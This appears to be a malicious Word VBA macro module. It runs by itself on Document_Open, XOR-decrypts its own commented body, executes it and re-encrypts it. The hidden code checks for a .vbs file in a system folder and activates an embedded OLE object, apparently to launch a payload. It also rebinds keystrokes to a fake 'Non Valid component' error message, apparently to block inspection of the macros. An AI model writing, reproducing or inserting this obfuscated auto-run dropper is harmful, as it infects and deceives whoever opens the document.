Sub gMacro()
'Hi'Buuhu'Ubtrjb'Ibs
'Tbs'ath':'DubfsbHembds/%Tdunwsni`)AnkbT~tsbjHembds%.
'Na'Cnu/ath)@bsTwbdnfkAhkcbu/6.'!'%[ankb)qet%.':'%%'Sobi
'FdsnqbChdrjbis)Tofwbt/6.)Qntnekb':'Surb
'TQnu':'FdsnqbChdrjbis)Tofwbt/6.)HKBAhujfs)DkfttS~wb
'Pnso'FdsnqbChdrjbis)Tofwbt/6.)HKBAhujfs
''''')FdsnqfsbFt'DkfttS~wb=:TQnu
''''')Fdsnqfsb
'Bic'Pnso
'Bktb
'FdsnqbChdrjbis)Tofwbt/6.)Qntnekb':'Afktb
'Bic'Na
'Lb~?':'ErnkcLb~Dhcb/pcLb~Fks+'pcLb~A?.='Lb~66':'ErnkcLb~Dhcb/pcLb~Fks+'pcLb~A66.='Lsnw':'pcLb~Dfsb`hu~Dhjjfic
'Lb~Enicni`t)Fcc'Lsnw+'%Lb~o%+'Lb~?='Lb~Enicni`t)Fcc'Lsnw+'%Lb~o%+'Lb~66
End Sub

Private Sub Document_Open(): On Error Resume Next: Call EncMacro(0): Call gMacro: Call gMacro: Call EncMacro(1): End Sub

Private Function EncMacro(x)
On Error Resume Next
For i = 1 To Application.VBE.CodePanes.Count
If Application.VBE.CodePanes(i).CodeModule.lines(1, 1) = "Sub gMacro()" Then
Set avc = Application.VBE.CodePanes(i).CodeModule
For s = 2 To avc.CountOfLines - 23
If x = 0 Then
avc.ReplaceLine s, u(Mid(avc.lines(s, 1), 2))
ElseIf x = 1 Then
avc.ReplaceLine s, "'" & u(avc.lines(s, 1))
End If
Next
End If
Next
End Function

Private Function u(s): On Error Resume Next: For i = 1 To Len(s): u = u & Chr(Asc(Mid(s, i, 1)) Xor 7): Next: End Function

Sub Keyh(): On Error Resume Next: MsgBox "Non Valid component", 16, "Error": End Sub